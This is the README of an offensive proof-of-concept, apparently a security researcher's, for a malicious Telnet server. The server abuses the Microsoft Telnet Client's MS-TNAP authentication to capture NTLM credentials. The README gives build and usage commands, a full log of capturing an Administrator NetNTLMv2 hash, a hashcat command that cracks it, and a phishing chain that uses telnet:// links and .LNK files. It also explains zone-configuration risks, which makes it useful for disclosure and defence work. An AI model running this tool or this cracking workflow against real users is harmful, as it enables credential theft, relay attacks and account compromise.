# Microsoft Telnet Client MS-TNAP Server-Side Authentication Token Exploit

## Overview

This proof-of-concept demonstrates a vulnerability in the Microsoft Telnet Client's MS-TNAP authentication protocol. When a client connects to a malicious Telnet server via `telnet.exe` or `telnet://` URI hyperlinks, and the MS-TNAP extension is detected, the server can extract authentication material from the client. If the exploit is run by a host in the Intranet or Trusted Zone, the credentials are sent automatically without prompting, making this practical for Red Team uses. 

The PoC completes the MS-TNAP process and captures NTLM authentication data, which can be used for:

- NTLM relaying attacks
- Offline password cracking (NetNTLMv1/v2 hashes)

## Vulnerability Details

The Microsoft Telnet Client with MS-TNAP extension will prompt users with a security warning when connecting to servers in untrusted zones (like Internet zone):

```
"You are about to send your password information to a remote computer in Internet zone.
This might not be safe. Do you want to send anyway (y/n):"
```

However, for servers in trusted zones (such as Intranet zone), or when the system's zone policy is configured for silent authentication, no warning will be displayed and credentials will be sent automatically.

If the user responds "yes" to the prompt (or if no prompt is shown due to zone settings), authentication material is sent to the server. An attacker can leverage this vulnerability in phishing attacks by enticing victims to click on malicious `telnet://` URI links.

### Security Zone Behavior

When connecting to a Telnet server, Windows checks the server against security zones:

- **Internet Zone**: Prompts user with warning before sending credentials
- **Intranet Zone**: May silently send credentials without prompting
- **Trusted Sites**: May silently send credentials without prompting

This behavior is particularly dangerous when hosts are added to the Intranet Zone or Trusted Sites Zone without protocol specifiers. For example, adding an IP address like `192.168.1.1` instead of `http://192.168.1.1` will apply the trust setting to all protocols (HTTP, HTTPS, Telnet, etc.) for that host. Many organizations add internal IP ranges to trusted zones without protocol specifiers, inadvertently allowing silent credential theft via Telnet and other protocols.

Windows checks for zone trust using the combination of protocol and host (e.g., `telnet://192.168.1.1`), so administrators should use protocol-specific entries when configuring trusted zones to limit exposure.

### Affected Systems

All Windows versions when the Microsoft Telnet Client is installed:

 * Windows NT 4.0
 * Windows 2000
 * Windows XP
 * Windows Server 2003
 * Windows Server 2003 R2
 * Windows Vista
 * Windows Server 2008
 * Windows Server 2008 R2
 * Windows 7
 * Windows Server 2012
 * Windows Server 2012 R2
 * Windows 8
 * Windows 8.1
 * Windows 10
 * Windows Server 2016
 * Windows Server 2019
 * Windows Server 2022
 * Windows 11
 * Windows Server 2025

## Usage

### Compilation

You can compile manually with Visual Studio C++ compiler in a Developer Command Prompt.

```
cl telnetclientpoc.cpp getopt.cpp stdafx.cpp /EHsc /MT ws2_32.lib secur32.lib
```

Or use the Makefile with "nmake", "nmake static" and "nmake clean"

### Command Line Options

```
telnetclientpoc.exe [-d domain] [-s server] [-c challenge] [-o logfile]
```

- `-d domain`: Set the domain name (default: WIN2K3)
- `-s server`: Set the server name (default: WIN2K3)
- `-c challenge`: Set a custom NTLM challenge (8 bytes as hex string)
- `-o logfile`: Set a custom log file path (default: telnetclientpoc.log)

### Example Usage

```
C:\> telnetclientpoc.exe
Server listening on port 23...
```

When a client connects, the application:

1. Logs detailed NTLM authentication steps to `telnetclientpoc.log`
2. Captures NetNTLMv2 hashes in `netntlmv2.hash` file & NTLMv1 in `ntlmv1.hash`
3. Provides detailed debug output on the console

## Example Output

```
Server listening on port 23...
Client connected.
Sent Frame 4
Received Frame 5 (3 bytes): FF FB 25
Sent Frame 6
Received Frame 7 (27 bytes): FF FD 01 FF FD 03 FF FB 27 FF FB 1F FF FA 1F 00 78 00 1E FF F0 FF FB 00 FF FD 00
Sent Frame 8
Received Frame 9 - NTLM Type 1 (57 bytes): FF FA 25 00 0F 00 00 28 00 00 00 02 00 00 00 4E 54 4C 4D 53 53 50 00 01 00 00 00 97 82 08 E2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0A 00 7C 4F 00 00 00 0F FF F0
NTLM signature found at position: 12
NTLM Type 1 Message:
  Signature: NTLMSSP
  Flags: 0xE2088297
  Negotiate Unicode
  Negotiate OEM
  Request Target
  Negotiate Sign
  Negotiate Lan Manager Key
  Negotiate NTLM
  Negotiate Always Sign
  Negotiate Extended Session Security
  Negotiate Key Exchange
  Negotiate 56
  Domain:
  Workstation:
  OS Version: 10.0 (Build 20348)
Received Frame 10 - Environment Variables (45 bytes): FF FA 27 00 FF F0 FF FA 27 00 03 53 46 55 54 4C 4E 54 56 45 52 01 32 03 53 46 55 54 4C 4E 54 4D 4F 44 45 01 43 6F 6E 73 6F 6C 65 FF F0
Environment Variable: SFUTLNTVER = 2
Environment Variable: SFUTLNTMODE = Console
Preparing to send Frame 11
Using domain: WIN2K3
Using server: WIN2K3
Using challenge: 31 7C 02 AC 07 8A 3C 43
Challenge inserted into Type 2 message: 31 7C 02 AC 07 8A 3C 43
Global challenge after setting: 31 7C 02 AC 07 8A 3C 43
Sending Frame 11 - NTLM Type 2 (153 bytes): FF FA 25 02 0F 00 01 88 00 00 00 02 00 00 00 4E 54 4C 4D 53 53 50 00 02 00 00 00 0C 00 0C 00 38 00 00 00 15 82 8A E2 31 7C 02 AC 07 8A 3C 43 00 00 00 00 00 00 00 00 44 00 44 00 44 00 00 00 05 02 CE 0E 00 00 00 0F 57 00 49 00 4E 00 32 00 4B 00 33 00 02 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 01 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 04 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 03 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 00 00 00 00 FF F0
NTLM signature found at position: 12
NTLM Type 2 Message:
  Signature: NTLMSSP
  Flags: 0xE28A8215
  Negotiate Unicode
  Request Target
  Negotiate NTLM
  Negotiate Extended Session Security
  Challenge: 31 7C 02 AC 07 8A 3C 43
  Target Name: WIN2K3
  Target Info:
    Domain Name: WIN2K3
    Server Name: WIN2K3
    DNS Domain Name: WIN2K3
    FQDN: WIN2K3
  OS Version: 5.2 (Build 3790)
Sent Frame 11
Received Frame 12 - NTLM Type 3 (465 bytes): FF FA 25 00 0F 00 02 C0 01 00 00 02 00 00 00 4E 54 4C 4D 53 53 50 00 03 00 00 00 18 00 18 00 AE 00 00 00 EA 00 EA 00 C6 00 00 00 1E 00 1E 00 58 00 00 00 1A 00 1A 00 76 00 00 00 1E 00 1E 00 90 00 00 00 10 00 10 00 B0 01 00 00 15 82 88 E2 0A 00 7C 4F 00 00 00 0F 5E CF 27 A8 A2 78 0D ED 5C 73 F3 03 E3 61 5F FA 57 00 49 00 4E 00 2D 00 52 00 4F 00 54 00 51 00 49 00 48 00 47 00 36 00 49 00 49 00 47 00 41 00 64 00 6D 00 69 00 6E 00 69 00 73 00 74 00 72 00 61 00 74 00 6F 00 72 00 57 00 49 00 4E 00 2D 00 52 00 4F 00 54 00 51 00 49 00 48 00 47 00 36 00 49 00 49 00 47 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 36 49 F8 DA E2 9C 4D 85 B3 1F 31 CF 78 5B 4F 01 01 00 00 00 00 00 00 31 A3 F7 3B D4 BD DB 01 CE 55 32 CC CD 64 AD 67 00 00 00 00 02 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 01 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 04 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 03 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 08 00 30 00 30 00 00 00 00 00 00 00 00 00 00 00 00 30 00 00 93 DC DD 10 7A E9 9F B9 F0 F1 8B AD AD 61 C5 76 A3 55 7C 60 7F 0B 8D 2F 70 68 8A 46 20 FC 12 52 0A 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 09 00 2A 00 74 00 65 00 6C 00 6E 00 65 00 74 00 2F 00 31 00 39 00 32 00 2E 00 31 00 36 00 38 00 2E 00 36 00 39 00 2E 00 32 00 31 00 31 00 00 00 00 00 00 00 00 00 D2 09 8A 43 A7 27 D6 75 8C F1 F6 CD CE 74 42 77 FF F0
NTLM signature found at position: 12
NTLM Type 3 Message:
  Signature: NTLMSSP
  Flags: 0xE2888215
  Negotiate Unicode
  Negotiate NTLM
  Negotiate Extended Session Security
  Domain: WIN-ROTQIHG6IIG
  Username: Administrator
  Host: WIN-ROTQIHG6IIG
  LM Response: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  NTLM Response: 38 36 49 F8 DA E2 9C 4D 85 B3 1F 31 CF 78 5B 4F 01 01 00 00 00 00 00 00 31 A3 F7 3B D4 BD DB 01 CE 55 32 CC CD 64 AD 67 00 00 00 00 02 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 01 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 04 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 03 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 08 00 30 00 30 00 00 00 00 00 00 00 00 00 00 00 00 30 00 00 93 DC DD 10 7A E9 9F B9 F0 F1 8B AD AD 61 C5 76 A3 55 7C 60 7F 0B 8D 2F 70 68 8A 46 20 FC 12 52 0A 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 09 00 2A 00 74 00 65 00 6C 00 6E 00 65 00 74 00 2F 00 31 00 39 00 32 00 2E 00 31 00 36 00 38 00 2E 00 36 00 39 00 2E 00 32 00 31 00 31 00 00 00 00 00 00 00 00 00
Global challenge before NTLM Type 2: 31 7C 02 AC 07 8A 3C 43
Hashcat NetNTLMv2 Format: Administrator::WIN-ROTQIHG6IIG:317c02ac078a3c43:383649f8dae29c4d85b31f31cf785b4f:010100000000000031a3f73bd4bddb01ce5532cccd64ad670000000002000c00570049004e0032004b00330001000c00570049004e0032004b00330004000c00570049004e0032004b00330003000c00570049004e0032004b003300080030003000000000000000000000000030000093dcdd107ae99fb9f0f18badad61c576a3557c607f0b8d2f70688a4620fc12520a0010000000000000000000000000000000000009002a00740065006c006e00650074002f003100390032002e003100360038002e00360039002e003200310031000000000000000000
Challenge used in hashcat format: 317c02ac078a3c43
  Session Key: D2 09 8A 43 A7 27 D6 75 8C F1 F6 CD CE 74 42 77
Sent Frame 15
Connection closed.
```

## Password Cracking with Hashcat

Once you've captured netntlmv2.hash files, you can use hashcat to crack them:

```
hashcat -m 5600 -a 0 -O netntlmv2.hash passwords.txt
```

Example output:

```
hashcat (v6.2.6) starting

[...]

ADMINISTRATOR::WIN-ROTQIHG6IIG:317c02ac078a3c43:383649f8dae29c4d85b31f31cf785b4f:010100000000000031a3f73bd4bddb01ce5532cccd64ad670000000002000c00570049004e0032004b00330001000c00570049004e0032004b00330004000c00570049004e0032004b00330003000c00570049004e0032004b003300080030003000000000000000000000000030000093dcdd107ae99fb9f0f18badad61c576a3557c607f0b8d2f70688a4620fc12520a0010000000000000000000000000000000000009002a00740065006c006e00650074002f003100390032002e003100360038002e00360039002e003200310031000000000000000000:Password1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ADMINISTRATOR::WIN-ROTQIHG6IIG:317c02ac078a3c43:383...000000
Time.Started.....: Mon May  5 10:46:24 2025 (0 secs)
Time.Estimated...: Mon May  5 10:46:24 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    11233 H/s (0.04ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12/12 (100.00%)
Rejected.........: 0/12 (0.00%)
Restore.Point....: 0/12 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: password -> Password1
```

## Security Implications

This exploit demonstrates how an attacker could:

1. Create a phishing email with a malicious `telnet://` URI
2. User clicks the link, launching the telnet client
3. The server captures authentication material from the client
4. Captured hashes can be used for offline password cracking or relay attacks

The telnet:// URI handler can be embedded in places where FileOpen type operations are performed, such as within .LNK files
for exploitation purposes. 

## Notes

On recent Windows systems, additional prompts may appear when clicking `telnet://` URIs in browsers, requiring the user to confirm execution of telnet.exe.

## Errata

This PoC creates NetNTLMv2 hashcat formatted output, there are bugs with the NetNTLMv1 hash output. When supplying a custom domain or workstation (-d/-s), only the first 6 bytes
are used in the NTLM type 2 message (this matters in relay attacks but is less important in capturing hashes), changing the length of these strings requires fixing the NTLM
type 2 packet to handle the longer strings. The full NTLM data is always stored in the telnetclientpoc.log for you to construct hashcat output manually or to use in relay situations.

## Credits

Developed by Hacker Fantastic, https://hacker.house

## License

These files are available under a Attribution-NonCommercial-NoDerivatives 4.0 International license.